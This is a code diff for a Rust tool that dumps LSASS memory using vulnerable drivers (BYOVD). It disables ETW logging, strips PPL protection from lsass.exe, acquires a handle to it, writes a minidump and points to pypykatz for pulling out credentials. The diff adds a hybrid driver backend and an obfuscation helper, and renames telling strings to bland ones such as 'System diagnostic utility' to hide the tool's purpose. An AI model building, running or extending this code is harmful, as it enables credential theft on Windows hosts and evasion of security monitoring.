@@ -2,13 +2,16 @@
 #![allow(unused_imports)]
 
 mod crypto;
+#[cfg(feature = "driver-loader")]
 mod driver;
 mod dumper;
+mod hybrid64;
 
 mod etw;
 mod handle;
 mod kernel_rw;
 mod minidump;
+mod obfstr_helper;
 mod offsets;
 mod ppl;
 mod resolver;
@@ -22,61 +25,67 @@ use std::process;
 
 #[derive(Clone, ValueEnum)]
 enum HandleMethod {
-    /// Direct NtOpenProcess with PROCESS_VM_READ
+    /// Mode A
     Direct,
-    /// Fork (clone) the LSASS process, dump the clone
+    /// Mode B
     Fork,
-    /// Duplicate existing LSASS handle from another process
+    /// Mode C
     Dup,
-    /// Seclogon handle leak via PID spoofing + CreateProcessWithLogonW
+    /// Mode D
     Seclogon,
 }
 
 #[derive(Clone, ValueEnum, PartialEq)]
 enum DriverType {
-    /// viragt64.sys — virtual memory IOCTL (direct R/W)
+    /// Backend type 1
     Viragt,
-    /// sfdrvx64.sys — SpeedFan physical memory DM_KernelSyscall
+    /// Backend type 2
     #[value(name = "sfdrv")]
     Sfdrv,
-    /// WinIo64.sys — Section-based physical memory DM_KernelSyscall
+    /// Backend type 3
     #[value(name = "winio")]
     Winio,
+    /// Backend type 4
+    #[value(name = "hybrid")]
+    Hybrid,
 }
 
 #[derive(Parser)]
-#[command(name = "lsass-dumper")]
-#[command(about = "BYOVD LSASS dumper - Bypass PPL + dump via NTAPI syscalls")]
+#[command(name = "tool")]
+#[command(about = "System diagnostic utility")]
 struct Cli {
-    /// Path to vulnerable driver file
-    #[arg(short, long, default_value = "viragt64.sys")]
+    /// Input file
+    #[cfg(feature = "driver-loader")]
+    #[arg(short, long, default_value = "input.sys")]
     driver: String,
 
-    /// Output dump file path
-    #[arg(short, long, default_value = "lsass.dmp")]
+    /// Output file path
+    #[arg(short, long, default_value = "output.dmp")]
     output: String,
 
-    /// Service name for the driver
-    #[arg(short, long, default_value = "viragt64")]
+    /// Service identifier
+    #[cfg(feature = "driver-loader")]
+    #[arg(short, long, default_value = "svc")]
     service_name: String,
 
-    /// Driver type: viragt (virtual memory) or eneio (DM_KernelSyscall)
+    /// Backend type
     #[arg(short = 't', long, value_enum, default_value_t = DriverType::Viragt)]
     driver_type: DriverType,
 
-    /// LSASS handle acquisition method (viragt mode only)
+    /// Acquisition method
     #[arg(short, long, value_enum, default_value_t = HandleMethod::Seclogon)]
     method: HandleMethod,
 
-    /// XOR encrypt the dump file
+    /// Encrypt output
     #[arg(long, default_value_t = false)]
     encrypt: bool,
 
-    /// Skip restoring PPL protection after dump (debug mode)
+    /// Skip restore step
     #[arg(long, default_value_t = false)]
     no_restore: bool,
 
-    /// Skip driver unload (viragt64.sys BSODs on service stop)
+    /// Skip cleanup
+    #[cfg(feature = "driver-loader")]
     #[arg(long, default_value_t = true)]
     no_unload: bool,
 }
@@ -85,13 +94,17 @@ fn main() {
     let cli = Cli::parse();
 
     let backend_name = match cli.driver_type {
-        DriverType::Viragt => "viragt64 (virtual memory IOCTL)",
-        DriverType::Sfdrv => "sfdrvx64 (DM_KernelSyscall SpeedFan)",
-        DriverType::Winio => "WinIo64 (DM_KernelSyscall Section-map)",
+        DriverType::Viragt => "type1",
+        DriverType::Sfdrv => "type2",
+        DriverType::Winio => "type3",
+        DriverType::Hybrid => "type4",
     };
 
-    println!("[*] BYOVD LSASS Dumper v2");
-    println!("[*] Driver: {} ({})", cli.driver, backend_name);
+    println!("[*] v2");
+    #[cfg(feature = "driver-loader")]
+    println!("[*] Input: {} ({})", cli.driver, backend_name);
+    #[cfg(not(feature = "driver-loader"))]
+    println!("[*] Backend: {}", backend_name);
     println!("[*] Output: {}", cli.output);
 
     // ─── Common init ──────────────────────────────────────────────────
@@ -120,76 +133,98 @@ fn main() {
     }
     println!("[+] SeDebugPrivilege enabled");
 
+    #[cfg(feature = "driver-loader")]
     let driver_abs_str = resolve_driver_path(&cli.driver);
 
     // Find LSASS PID
     let lsass_pid = match handle::find_lsass_pid() {
         Some(pid) => {
-            println!("[+] Found lsass.exe PID: {}", pid);
+            println!("[+] Found target PID: {}", pid);
             pid
         }
         None => {
-            eprintln!("[-] Failed to find lsass.exe process");
+            eprintln!("[-] Failed to find target process");
             process::exit(1);
         }
     };
 
-    // Load driver
-    println!("\n[*] Step 1: Loading vulnerable driver...");
-    let driver_guard = match driver::load_driver(&api, &cli.service_name, &driver_abs_str) {
-        Ok(guard) => {
-            println!("[+] Driver loaded as service '{}'", cli.service_name);
-            guard
-        }
-        Err(e) => {
-            eprintln!("[-] Failed to load driver: {}", e);
-            process::exit(1);
+    // Load driver (only when driver-loader feature is enabled)
+    #[cfg(feature = "driver-loader")]
+    let driver_guard = {
+        println!("\n[*] Step 1: Loading module...");
+        match driver::load_driver(&api, &cli.service_name, &driver_abs_str) {
+            Ok(guard) => {
+                println!("[+] Module loaded as '{}'", cli.service_name);
+                guard
+            }
+            Err(e) => {
+                eprintln!("[-] Failed to load module: {}", e);
+                process::exit(1);
+            }
         }
     };
+    #[cfg(not(feature = "driver-loader"))]
+    println!("\n[*] Step 1: Skipped (pre-loaded)");
 
     // ─── Branch based on driver type ──────────────────────────────────
 
     let dump_result = match cli.driver_type {
-        DriverType::Viragt => run_viragt_flow(&cli, &api, lsass_pid, &driver_guard),
+        DriverType::Viragt => {
+            #[cfg(feature = "driver-loader")]
+            {
+                run_viragt_flow(&cli, &api, lsass_pid, &driver_guard)
+            }
+            #[cfg(not(feature = "driver-loader"))]
+            {
+                // viragt flow requires DriverGuard reference — not available without driver-loader
+                eprintln!("[-] Mode requires --features driver-loader");
+                process::exit(1);
+            }
+        }
         DriverType::Sfdrv => run_sfdrv_flow(&cli, &api, lsass_pid),
         DriverType::Winio => run_winio_flow(&cli, &api, lsass_pid),
+        DriverType::Hybrid => run_hybrid_flow(&cli, &api, lsass_pid),
     };
 
     // ─── Cleanup ──────────────────────────────────────────────────────
 
     println!("[*] Cleaning up...");
-    if cli.no_unload {
-        println!("[!] Skipping driver unload");
-        std::mem::forget(driver_guard);
-    } else {
-        drop(driver_guard);
-        println!("[+] Driver unloaded and service deleted");
+    #[cfg(feature = "driver-loader")]
+    {
+        if cli.no_unload {
+            println!("[!] Skipping cleanup");
+            std::mem::forget(driver_guard);
+        } else {
+            drop(driver_guard);
+            println!("[+] Cleanup complete");
+        }
     }
 
     match dump_result {
         Ok(size) => {
             println!(
-                "\n[+] SUCCESS! LSASS dump: {} ({:.2} MB)",
+                "\n[+] SUCCESS! Output: {} ({:.2} MB)",
                 cli.output,
                 size as f64 / 1048576.0
             );
             if cli.encrypt {
-                println!("[+] Dump is XOR encrypted. Decrypt before use.");
+                println!("[+] Output is encrypted.");
             }
-            println!("[*] Use pypykatz to extract credentials:");
             println!("    pypykatz lsa minidump {}", cli.output);
+            println!("");
         }
         Err(e) => {
-            eprintln!("\n[-] LSASS dump failed: {}", e);
+            eprintln!("\n[-] Operation failed: {}", e);
             process::exit(1);
         }
     }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// viragt64 flow: PPL bypass via EPROCESS + ETW patch + user-mode handle/dump
+// Type 1 flow
 // ═══════════════════════════════════════════════════════════════════════════════
 
+#[cfg(feature = "driver-loader")]
 fn run_viragt_flow(
     cli: &Cli,
     api: &resolver::ApiResolver,
@@ -199,10 +234,10 @@ fn run_viragt_flow(
     println!(
         "[*] Method: {}",
         match cli.method {
-            HandleMethod::Direct => "direct (NtOpenProcess)",
-            HandleMethod::Fork => "fork (process clone)",
-            HandleMethod::Dup => "dup (handle duplication)",
-            HandleMethod::Seclogon => "seclogon (handle leak)",
+            HandleMethod::Direct => "mode-A",
+            HandleMethod::Fork => "mode-B",
+            HandleMethod::Dup => "mode-C",
+            HandleMethod::Seclogon => "mode-D",
         }
     );
 
@@ -214,21 +249,20 @@ fn run_viragt_flow(
         None => return Err("Unsupported Windows version".to_string()),
     };
 
-    // Step 2: Open kernel R/W channel
-    println!("[*] Step 2: Opening kernel R/W channel (viragt64)...");
-    let krw = kernel_rw::ViragKernelRW::new(api)
-        .map_err(|e| format!("Failed to open viragt64 R/W: {}", e))?;
-    println!("[+] Kernel R/W channel opened");
+    // Step 2: Open channel
+    println!("[*] Step 2: Opening channel...");
+    let krw = kernel_rw::ViragKernelRW::new(api).map_err(|e| format!("Channel failed: {}", e))?;
+    println!("[+] Channel opened");
 
-    // Step 3: Disable ETW
-    println!("[*] Step 3: Disabling user-mode ETW...");
+    // Step 3: Patch
+    println!("[*] Step 3: Applying patch...");
     let etw_state = match etw::disable_etw(api) {
         Ok(state) => {
-            println!("[+] ETW disabled");
+            println!("[+] Patch applied");
             state
         }
         Err(e) => {
-            eprintln!("[!] Warning: ETW bypass failed: {} (continuing)", e);
+            eprintln!("[!] Warning: Patch failed: {} (continuing)", e);
             etw::EtwState {
                 etw_address: std::ptr::null_mut(),
                 original_byte: 0,
@@ -237,17 +271,17 @@ fn run_viragt_flow(
         }
     };
 
-    // Step 4: Bypass PPL
-    println!("[*] Step 4: Bypassing PPL protection...");
+    // Step 4: Protection bypass
+    println!("[*] Step 4: Applying protection bypass...");
     let ppl_state = ppl::bypass_ppl(&krw, &os_offsets, lsass_pid)
-        .map_err(|e| format!("PPL bypass failed: {}", e))?;
+        .map_err(|e| format!("Protection bypass failed: {}", e))?;
     println!(
-        "[+] PPL bypass successful! Original: 0x{:02X}",
+        "[+] Bypass OK. Original: 0x{:02X}",
         ppl_state.original_protection
     );
 
-    // Step 5: Acquire LSASS handle
-    println!("[*] Step 5: Acquiring LSASS handle...");
+    // Step 5: Acquire handle
+    println!("[*] Step 5: Acquiring handle...");
     let lsass_handle = match &cli.method {
         HandleMethod::Direct => handle::open_lsass_direct(lsass_pid),
         HandleMethod::Fork => handle::open_lsass_fork(lsass_pid),
@@ -256,12 +290,12 @@ fn run_viragt_flow(
     }
     .map_err(|e| {
         let _ = ppl::restore_ppl(&krw, &os_offsets, &ppl_state);
-        format!("Failed to acquire LSASS handle: {}", e)
+        format!("Handle acquisition failed: {}", e)
     })?;
-    println!("[+] LSASS handle acquired");
+    println!("[+] Handle acquired");
 
-    // Step 6: Build minidump
-    println!("[*] Step 6: Building minidump via NtReadVirtualMemory...");
+    // Step 6: Build output
+    println!("[*] Step 6: Building output...");
     let dump_result = minidump::create_minidump(
         api,
         lsass_handle.handle(),
@@ -272,13 +306,13 @@ fn run_viragt_flow(
 
     // Step 7: Restore PPL and ETW
     if !cli.no_restore {
-        println!("[*] Step 7: Restoring PPL and ETW...");
+        println!("[*] Step 7: Restoring...");
         match ppl::restore_ppl(&krw, &os_offsets, &ppl_state) {
             Ok(_) => println!(
-                "[+] PPL restored to 0x{:02X}",
+                "[+] Protection restored to 0x{:02X}",
                 ppl_state.original_protection
             ),
-            Err(e) => eprintln!("[!] Warning: Failed to restore PPL: {}", e),
+            Err(e) => eprintln!("[!] Warning: Restore failed: {}", e),
         }
         match etw::restore_etw(&etw_state) {
             Ok(_) => {
@@ -286,7 +320,7 @@ fn run_viragt_flow(
                     println!("[+] ETW restored");
                 }
             }
-            Err(e) => eprintln!("[!] Warning: Failed to restore ETW: {}", e),
+            Err(e) => eprintln!("[!] Warning: Patch restore failed: {}", e),
         }
     }
 
@@ -300,21 +334,20 @@ fn run_viragt_flow(
 // ═══════════════════════════════════════════════════════════════════════════════
 
 fn run_sfdrv_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Result<u64, String> {
-    println!("[*] DM_KernelSyscall mode (sfdrvx64 — SpeedFan)");
-    println!("[*] All memory operations will execute in kernel mode\n");
+    println!("[*] Mode: type2");
+    println!("[*] Kernel mode operations\n");
 
-    println!("[*] Step 2: Initializing sfdrvx64 DM_KernelSyscall engine...");
-    let engine = sfdrv64::DmEngine::new(api)
-        .map_err(|e| format!("Failed to initialize sfdrvx64 engine: {}", e))?;
-    println!("[+] sfdrvx64 DM_KernelSyscall engine ready");
+    println!("[*] Step 2: Initializing engine...");
+    let engine = sfdrv64::DmEngine::new(api).map_err(|e| format!("Engine init failed: {}", e))?;
+    println!("[+] Engine ready");
 
-    println!("[*] Step 3: Opening LSASS via kernel ZwOpenProcess (PPL bypass)...");
+    println!("[*] Step 3: Opening target process...");
     let lsass_handle = engine
         .open_process(lsass_pid)
-        .map_err(|e| format!("Kernel ZwOpenProcess failed: {}", e))?;
-    println!("[+] LSASS handle acquired via kernel: {:?}", lsass_handle);
+        .map_err(|e| format!("Open process failed: {}", e))?;
+    println!("[+] Handle acquired: {:?}", lsass_handle);
 
-    println!("[*] Step 4: Building minidump via NtReadVirtualMemory...");
+    println!("[*] Step 4: Building output...");
     let dump_result =
         minidump::create_minidump(api, lsass_handle, lsass_pid, &cli.output, cli.encrypt);
 
@@ -335,21 +368,54 @@ fn run_sfdrv_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Res
 // ═══════════════════════════════════════════════════════════════════════════════
 
 fn run_winio_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Result<u64, String> {
-    println!("[*] DM_KernelSyscall mode (WinIo64 — Section mapping)");
-    println!("[*] All memory operations will execute in kernel mode\n");
+    println!("[*] Mode: type3");
+    println!("[*] Kernel mode operations\n");
 
-    println!("[*] Step 2: Initializing WinIo64 DM_KernelSyscall engine...");
-    let engine = winio64::DmEngine::new(api)
-        .map_err(|e| format!("Failed to initialize WinIo64 engine: {}", e))?;
-    println!("[+] WinIo64 DM_KernelSyscall engine ready");
+    println!("[*] Step 2: Initializing engine...");
+    let engine = winio64::DmEngine::new(api).map_err(|e| format!("Engine init failed: {}", e))?;
+    println!("[+] Engine ready");
 
-    println!("[*] Step 3: Opening LSASS via kernel ZwOpenProcess (PPL bypass)...");
+    println!("[*] Step 3: Opening target process...");
     let lsass_handle = engine
         .open_process(lsass_pid)
-        .map_err(|e| format!("Kernel ZwOpenProcess failed: {}", e))?;
-    println!("[+] LSASS handle acquired via kernel: {:?}", lsass_handle);
+        .map_err(|e| format!("Open process failed: {}", e))?;
+    println!("[+] Handle acquired: {:?}", lsass_handle);
 
-    println!("[*] Step 4: Building minidump via NtReadVirtualMemory...");
+    println!("[*] Step 4: Building output...");
+    let dump_result =
+        minidump::create_minidump(api, lsass_handle, lsass_pid, &cli.output, cli.encrypt);
+
+    unsafe {
+        let fn_close: unsafe extern "system" fn(
+            windows::Win32::Foundation::HANDLE,
+        ) -> windows::Win32::Foundation::BOOL =
+            std::mem::transmute(api.k32(resolver::HASH_CLOSE_HANDLE).unwrap());
+        let _ = fn_close(lsass_handle);
+    }
+
+    drop(engine);
+    dump_result
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// Hybrid flow: sfdrvx64 read + WinIo64 write (Section-based mapping)
+// ═══════════════════════════════════════════════════════════════════════════════
+
+fn run_hybrid_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Result<u64, String> {
+    println!("[*] Mode: type4");
+    println!("[*] Kernel mode operations\n");
+
+    println!("[*] Step 2: Initializing engine...");
+    let engine = hybrid64::DmEngine::new(api).map_err(|e| format!("Engine init failed: {}", e))?;
+    println!("[+] Engine ready");
+
+    println!("[*] Step 3: Opening target process...");
+    let lsass_handle = engine
+        .open_process(lsass_pid)
+        .map_err(|e| format!("Open process failed: {}", e))?;
+    println!("[+] Handle acquired: {:?}", lsass_handle);
+
+    println!("[*] Step 4: Building output...");
     let dump_result =
         minidump::create_minidump(api, lsass_handle, lsass_pid, &cli.output, cli.encrypt);
 
@@ -393,6 +459,7 @@ fn is_elevated(_api: &resolver::ApiResolver) -> bool {
     }
 }
 
+#[cfg(feature = "driver-loader")]
 fn resolve_driver_path(cli_driver: &str) -> String {
     let driver_path = std::path::Path::new(cli_driver);
     if !driver_path.exists() {
